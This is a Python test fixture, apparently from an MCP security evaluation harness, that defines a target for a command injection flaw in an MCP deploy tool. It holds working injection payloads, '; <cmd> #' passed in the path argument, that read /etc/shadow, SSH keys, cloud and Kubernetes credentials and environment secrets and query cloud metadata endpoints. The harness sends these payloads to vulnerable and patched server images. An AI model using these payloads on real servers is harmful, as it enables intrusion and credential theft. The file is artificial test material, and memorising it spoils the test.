"""CVE-2026-5602: @nor2/heim-mcp OS command injection (CWE-77/78, command execution).

Every MCP deploy tool builds a shell command string by interpolating a caller-controlled `path`
straight into `exec(`heim deploy ${path}`)`, so a path carrying a shell separator (`;`) runs an
arbitrary command whose stdout the tool returns. The command-execution reach then surfaces any
nonce a command can read on the host: planted files, the process environment, the account
identity, the container hostname, and the internal HTTP endpoints a curl can hit. The patched
version (execFile, argv array, no shell) passes the same payload as one literal argument, so
nothing surfaces. The fixture exercises deploy_heim_application, the cleanest of the three tools
that share the flaw (one exec, returns stdout+stderr).

`heim` itself is an external CLI the server shells out to, stubbed to a benign no-op (exit 0) in
both images; the injection lives entirely in heim-mcp's exec call, so the stub is an adapter, not
a stand-in.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import command_injection_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

SERVICE = "holdout-2026-5602-heim"
PATCHED = "holdout-2026-5602-heim-patched"
# The deploy tool is nominally pointed at the in-scope checkout; command-execution coordinates are
# absolute or $HOME-rooted, so the working directory does not affect planting.
WORKING_DIRECTORY = "/srv/app"
TOOL = "deploy_heim_application"

# One injected shell command per kept place, each reading that place's planted nonce. The payload
# breaks out of `heim deploy ...` with a `;` separator; the real flaw is the unescaped
# interpolation, so a bare separator is enough. The IP-literal endpoints (imds/ecs/eks) are served
# in the planting holder's namespace the target joins, so has_network stays false.
_PLACE_COMMANDS: dict[str, str] = {
    "process-account-identity": "id -un",
    "etc-shadow": "cat /etc/shadow",
    "container-hostname": "cat /etc/hostname",
    "aws-credentials": "cat /tmp/.aws/credentials",
    "gcloud-adc": "cat /tmp/.config/gcloud/application_default_credentials.json",
    "azure-profile": "cat /tmp/.azure/azureProfile.json",
    "ssh-private-key": "cat /tmp/.ssh/id_rsa /tmp/.ssh/id_ed25519",
    "shell-history": "cat /tmp/.bash_history /tmp/.zsh_history",
    "git-credentials": "cat /tmp/.git-credentials",
    "npmrc": "cat /tmp/.npmrc",
    "gh-hosts": "cat /tmp/.config/gh/hosts.yml",
    "docker-config": "cat /tmp/.docker/config.json",
    "kube-config": "cat /tmp/.kube/config",
    "pgpass": "cat /tmp/.pgpass",
    "mysql-client-cnf": "cat /tmp/.my.cnf",
    "mongorc": "cat /tmp/.mongorc.js",
    "mysql-system-cnf": "cat /etc/mysql/my.cnf",
    "proc-environ": "printenv MCP_UPSTREAM_SECRET",
    "run-secrets": "cat /run/secrets/db_password",
    "k8s-sa-token": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
    "imds": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "ecs-task-credentials": "curl -s http://169.254.170.2/v2/credentials/",
    "eks-pod-identity": "curl -s http://169.254.170.23/v1/credentials",
    "etc-hosts": "cat /etc/hosts",
    "auth-log": "cat /var/log/auth.log /var/log/secure",
}

KEPT_PLACES: tuple[str, ...] = tuple(_PLACE_COMMANDS)

AIM = re.compile(r";\s*\w")  # the `; <cmd>` separator, present in every exploit, absent from benign


def _exploit(command: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool(TOOL, {"path": f"; {command} #"})

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool(TOOL, {"path": "/srv/app"})


TARGET = CVETarget(
    cve_id="CVE-2026-5602",
    severity="CVSS 8.8 (v3.1, placeholder)",
    mechanism=MechanismClass.COMMAND_EXECUTION,
    aim=AIM,
    reaches=frozenset({"command_execution"}),
    kept_places=KEPT_PLACES,
    images=(SERVICE,),
    server_image=SERVICE,
    patched_image=PATCHED,
    planting_host=PlantingHost(SymbolicUser.UNPRIVILEGED, WORKING_DIRECTORY, has_network=False),
    builder=command_injection_env,
    exploits=tuple(_exploit(cmd) for cmd in _PLACE_COMMANDS.values()),
    benign=_benign,
    awaited_capability=None,
    note=(
        "OS command injection: deploy_heim_application interpolates its attacker-controlled path "
        "into a shell string run with child_process.exec, so a path with a shell separator "
        "(`; <cmd>`) executes it in the server's container."
    ),
    tools_filter=None,
)
